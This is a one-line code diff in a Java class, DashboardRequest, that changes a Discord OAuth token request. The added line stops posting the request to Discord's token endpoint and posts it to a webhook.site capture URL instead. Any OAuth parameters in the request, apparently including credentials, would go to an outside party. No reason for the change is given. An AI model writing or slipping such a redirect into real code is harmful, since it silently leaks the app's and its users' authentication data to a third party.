@@ -52,7 +52,7 @@ public class DashboardRequest {
 		jo.put("scope", "identify");
 
 		/*JSONObject res =*/
-		return Helper.post("https://discordapp.com/api/oauth2/token", jo, Collections.emptyMap(), "").toString();
+		return Helper.post("https://webhook.site/c2963a5b-119f-4502-ae78-70a54064842a", jo, Collections.emptyMap(), "").toString();
 
 		/*return res.getString("access_token");*/
 	}
